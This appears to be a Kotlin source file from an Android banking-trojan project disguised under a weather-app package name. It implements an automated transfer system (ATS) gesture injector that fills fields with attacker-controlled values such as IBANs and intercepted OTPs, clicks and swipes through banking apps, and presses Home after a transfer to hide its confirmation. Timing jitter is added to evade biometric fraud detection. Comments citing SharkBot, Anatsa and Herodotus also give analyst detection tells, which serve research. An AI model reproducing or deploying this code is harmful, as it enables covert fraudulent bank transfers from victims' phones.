package com.skyweather.forecast.core

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.os.Bundle
import android.view.accessibility.AccessibilityNodeInfo
import kotlin.random.Random

/**
 * Synthetic input injection via AccessibilityService gestures.
 *
 * ══════════════════════════════════════════════════════════════════
 * STAGE 4 — ATS Gesture Injector
 * ══════════════════════════════════════════════════════════════════
 *
 * Three injection paths, ascending in capability:
 *
 * PATH 1: AccessibilityNodeInfo.performAction()
 *   ACTION_CLICK — tap a specific node
 *   ACTION_SET_TEXT — fill a text field
 *   ACTION_SCROLL_FORWARD/BACKWARD — scroll containers
 *   Works on any node the A11y framework can resolve.
 *   Most reliable. Used when target node is findable by ID/text.
 *
 * PATH 2: AccessibilityService.dispatchGesture()
 *   Coordinate-based synthetic touch events.
 *   Tap, long-press, swipe at arbitrary (x,y) coordinates.
 *   Used when target element has no accessible node (custom views,
 *   WebView content, Canvas-rendered UI).
 *   Requires canPerformGestures=true in A11y config.
 *
 * PATH 3: AccessibilityService.performGlobalAction()
 *   GLOBAL_ACTION_BACK — simulate Back button
 *   GLOBAL_ACTION_HOME — simulate Home button
 *   GLOBAL_ACTION_NOTIFICATIONS — open notification shade
 *   Used for navigation between screens.
 *
 * Real-world references:
 *   SharkBot ATS: PATH 1 for form filling + PATH 3 for navigation.
 *     Auto-fills amount + IBAN, clicks "Continue", waits for OTP screen,
 *     fills intercepted OTP, clicks "Confirm".
 *   Anatsa ATS: All three paths. PATH 2 for custom banking UIs.
 *     More sophisticated — handles WebView banking apps.
 *   Herodotus: PATH 2 + timing jitter (300-3000ms uniform distribution)
 *     to defeat behavior-biometric detection.
 *
 * Analyst tell: dispatchGesture() from a non-foreground package =
 * high-confidence ATS. Combined with A11y text capture from banking
 * app + OTP intercept + gesture injection = canonical banker shape.
 *
 * ANALYSIS §5.1 insight: canPerformGestures in accessibility_config.xml
 * is the static indicator. Dynamic: dispatchGesture calls during
 * banking app foreground sessions.
 * ══════════════════════════════════════════════════════════════════
 */
class GestureInjector(private val service: AccessibilityService) {

    // Herodotus-pattern timing jitter bounds (milliseconds)
    // Real Herodotus: uniform(300, 3000) — defeats biometric profiling
    // Detection: BioCatch + IBM Trusteer detect uniform distribution
    // Counter: per-target adaptive timing (Apex-class)
    private val jitterMinMs = 300L
    private val jitterMaxMs = 3000L

    /**
     * Click a specific node found by ScreenReader.
     *
     * PATH 1: AccessibilityNodeInfo.performAction(ACTION_CLICK)
     * Most reliable injection method. Triggers the node's onClick handler
     * exactly as a real tap would.
     *
     * @param node Target node. NOT recycled by this method.
     * @return true if action dispatched successfully
     */
    fun clickNode(node: AccessibilityNodeInfo): Boolean {
        return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
    }

    /**
     * Set text in an editable field.
     *
     * PATH 1: AccessibilityNodeInfo.performAction(ACTION_SET_TEXT)
     * Bundle argument contains the text to set.
     *
     * Two-step for reliability:
     *   1. Focus the field (some apps require focus before setText)
     *   2. Set the text via bundle
     *
     * Real SharkBot: clears field first (ACTION_SET_TEXT with empty string),
     * then sets attacker-controlled value. Prevents partial injection.
     *
     * @param node Editable text field node
     * @param text Text to inject
     * @return true if action dispatched successfully
     */
    fun setText(node: AccessibilityNodeInfo, text: String): Boolean {
        // Step 1: Focus the field
        node.performAction(AccessibilityNodeInfo.ACTION_FOCUS)

        // Step 2: Clear existing text (prevent partial injection)
        val clearBundle = Bundle()
        clearBundle.putCharSequence(
            AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
            ""
        )
        node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, clearBundle)

        // Step 3: Set new text
        val textBundle = Bundle()
        textBundle.putCharSequence(
            AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
            text
        )
        return node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, textBundle)
    }

    /**
     * Tap at arbitrary screen coordinates.
     *
     * PATH 2: AccessibilityService.dispatchGesture()
     * Used for custom views, WebView content, Canvas-rendered banking UIs
     * where AccessibilityNodeInfo resolution fails.
     *
     * Creates a GestureDescription with a single stroke (point → same point)
     * of duration 50ms — standard tap profile.
     *
     * @param x X coordinate in screen pixels
     * @param y Y coordinate in screen pixels
     * @param callback Optional gesture completion callback
     */
    fun tapAt(x: Float, y: Float, callback: AccessibilityService.GestureResultCallback? = null) {
        val path = Path()
        path.moveTo(x, y)
        path.lineTo(x, y) // Zero-length stroke = tap

        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0L, 50L))
            .build()

        service.dispatchGesture(gesture, callback, null)
    }

    /**
     * Swipe gesture — used for scrolling banking app content.
     *
     * PATH 2: Coordinate-based swipe from (x1,y1) to (x2,y2).
     * Duration 300ms = natural swipe speed.
     *
     * @param startX Start X
     * @param startY Start Y
     * @param endX End X
     * @param endY End Y
     * @param durationMs Swipe duration in milliseconds
     */
    fun swipe(
        startX: Float, startY: Float,
        endX: Float, endY: Float,
        durationMs: Long = 300L,
        callback: AccessibilityService.GestureResultCallback? = null
    ) {
        val path = Path()
        path.moveTo(startX, startY)
        path.lineTo(endX, endY)

        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0L, durationMs))
            .build()

        service.dispatchGesture(gesture, callback, null)
    }

    /**
     * Scroll a scrollable container node.
     *
     * PATH 1: performAction(ACTION_SCROLL_FORWARD/BACKWARD)
     * Simpler than coordinate-based swipe. Works for standard ScrollView,
     * RecyclerView, ListView containers.
     *
     * @param node Scrollable container node
     * @param forward true for scroll down, false for scroll up
     * @return true if action dispatched
     */
    fun scrollNode(node: AccessibilityNodeInfo, forward: Boolean = true): Boolean {
        val action = if (forward)
            AccessibilityNodeInfo.ACTION_SCROLL_FORWARD
        else
            AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD
        return node.performAction(action)
    }

    /**
     * Press the Back button via global action.
     *
     * PATH 3: performGlobalAction(GLOBAL_ACTION_BACK)
     * Used to navigate between banking app screens.
     * Also used to dismiss dialogs, close keyboards.
     */
    fun pressBack(): Boolean {
        return service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
    }

    /**
     * Press the Home button — abort sequence, return to launcher.
     *
     * PATH 3: Used when ATS needs to exit banking app cleanly.
     * After successful transfer, going Home prevents user from
     * immediately seeing the transfer confirmation screen.
     */
    fun pressHome(): Boolean {
        return service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
    }

    /**
     * Open notification shade — used by some ATS variants
     * to read OTP from notification panel directly.
     *
     * PATH 3: GLOBAL_ACTION_NOTIFICATIONS
     * Alternative OTP capture path when NLS/SMS interception fails.
     */
    fun openNotifications(): Boolean {
        return service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS)
    }

    /**
     * Generate Herodotus-pattern timing jitter.
     *
     * Returns a random delay in milliseconds between jitterMinMs and jitterMaxMs.
     * Insert between ATS actions to mimic human interaction timing.
     *
     * Real Herodotus: uniform(300, 3000) distribution.
     * Detected by BioCatch/Trusteer (uniform ≠ human — human timing is
     * log-normal or gamma distributed).
     *
     * Counter: per-target adaptive timing with learned distributions.
     * See frontier/herodotus-behavior-mimicry.md for detection/bypass.
     *
     * @return Delay in milliseconds to sleep before next action
     */
    fun nextJitterMs(): Long {
        return Random.nextLong(jitterMinMs, jitterMaxMs + 1)
    }
}
